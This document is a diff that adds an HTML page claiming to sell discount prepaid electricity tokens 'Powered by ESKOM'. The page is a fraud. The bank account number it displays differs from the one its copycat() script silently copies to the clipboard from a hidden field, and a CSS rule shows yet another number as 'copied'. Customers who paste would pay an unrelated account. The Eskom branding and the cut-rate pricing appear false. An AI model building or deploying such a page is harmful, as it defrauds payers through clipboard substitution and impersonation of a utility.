@@ -1,1 +1,125 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+message = `You have not made a payment yet!
+
+Note: In order to receive your electricity token immediately after payment, please make sure the payment is an immediate payment. If the payment is not immediate, it could take up to 24 - 48 hours to receive your electricity token.
+
+The payment reference should be the recipient meter number & the electricity token number will be sent to the phone number provided via SMS.`;
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="theme-color" content="rgba(51,85,123,1)">
+		<meta name="author" content="Prepaid Electricity Shop">
+		<meta name="description" content="Buy affordable electricity tokens with your meter number. We support all prepaid electricity meters from Eskom & other third party prepaid meter providers.">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Discount Prepaid Electricity</title>
+
+    <!-- Font Icon -->
+    <link rel="stylesheet" href="fonts/material-icon/css/material-design-iconic-font.min.css">
+
+    <!-- Main css -->
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="icon.jpg">
+	<style>
+	.offers {padding:unset;box-sizing: content-box;}
+	#chosen {background-color:rgba(51,85,123,1);color:white;}
+	.offerlist {height: 8em;overflow-x:hidden;overflow-y: auto;}
+	.lastdiv {content:"	\01F4CB";position:absolute;height:40px;right:16px;display:inline-block;margin-top:-32px;transition:all 3s;}
+	.lasv input {outline-color:transparent;border:1px solid transparent;}
+	.lasv #acc:focus {border:1px solid dodgerblue;}
+	.lasv #acc:focus + .lastdiv {color:dodgerblue;}
+	.lasv #acc:focus + .lastdiv:after {content:" 897857856 Account Number Copied!";background-color:white;}
+	[aria-hidden='false']+h5 {position:relative;top:5em;}
+	</style>
+</head>
+<body>
+
+    <div class="main">
+
+        <div class="container">
+            <form method="POST" id="signup-form" class="signup-form" enctype="multipart/form-data">
+                <h3>
+                 Details   
+                </h3>
+                <fieldset>
+                    <h2>BUY DISCOUNT PREPAID ELECTRICITY ONLINE</h2>
+                    <div class="form-group">
+                        <input type="number" name="meter" id="meter" placeholder="Meter Number"/>
+                   
+                        <input type="number" name="phone" id="phone" placeholder="Phone Number (to receive token)"/>
+                    </div>
+                </fieldset>
+
+                <h3>
+                    Amount
+                </h3>
+                <fieldset>
+                    <h2>SELECT AMOUNT</h2>
+                    <div class="form-group offerlist">
+                        <input type="SUBMIT" value="14.9 kWh - R10" onclick="highlight(event,this);" class="offers" id="chosen"/>
+                        <input type="SUBMIT" value="81.4 kWh - R50" onclick="highlight(event,this);" class="offers"/>
+                        <input type="SUBMIT" value="174.1 kWh - R100" onclick="highlight(event,this);" class="offers"/>
+                        <input type="SUBMIT" value="362.1 kWh - R200" onclick="highlight(event,this);" class="offers"/>
+                        <input type="SUBMIT" value="941.9 kWh - R500" onclick="highlight(event,this);" class="offers"/>
+                        <input type="SUBMIT" value="2107.4 kWh - R1000" onclick="highlight(event,this);" class="offers"/>
+                    </div>
+                </fieldset>
+
+                <h3>
+                    Payment
+                </h3>
+                <fieldset> 
+                    <h2>WE ACCEPT EFT PAYMENTS</h2>
+                    <div class="form-group lasv">
+                        <input type="text" id="product" value="14.9 kWh - R10 &nbsp; Prepaid Electricity" readonly/>
+                        <input type="text" id="reference" value="Payment Reference: 5656567" readonly/>
+                        <input type="text" id="invacc" value="7876567576" style="visibility:hidden;height:0px;width:0px;margin:0px;display:none;"/>
+                        <input type="text" id="acc" value="Bidvest Bank Current Acc: 7896787" onfocus="copycat();window.setTimeout(function(){ reference.focus();},2000);" readonly/><div class="lastdiv" tabindex="2" onfocus="this.previousSibling.focus()">&#128203;</div>
+                        <input type="text" id="recipient" value="Token Recipient: 0722148382" readonly/>
+                    </div>
+                    
+                </fieldset>
+				
+			<h5 align="center" style="transition:all 2s">Powered by <a href="https://eskom.co.za" style="color:blue;">ESKOM</a></h5>
+            </form>
+        </div>
+
+    </div>
+
+    <!-- JS -->
+    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="vendor/jquery-validation/dist/jquery.validate.min.js"></script>
+    <script src="vendor/jquery-validation/dist/additional-methods.min.js"></script>
+    <script src="vendor/jquery-steps/jquery.steps.min.js"></script>
+    <script src="js/main.js"></script>
+    <script>
+	highlight = function(event,ob) {
+	event.preventDefault();
+	offers = document.getElementsByClassName('offers');
+	var i;
+	for (i = 0; i < offers.length; i++) {
+	offers[i].id = "";
+	}
+	ob.id = "chosen";
+	ob.blur();
+		}
+		
+		copycat = function() {
+  /* Get the text field */
+  var copyText = document.getElementById("invacc");
+
+  /* Select the text field */
+  copyText.select();
+  copyText.setSelectionRange(0, 99999); /*For mobile devices*/
+
+  /* Copy the text inside the text field */
+  document.execCommand("copy");
+
+  /* Alert the copied text */;
+}
+	</script>
+</body>
+</html>
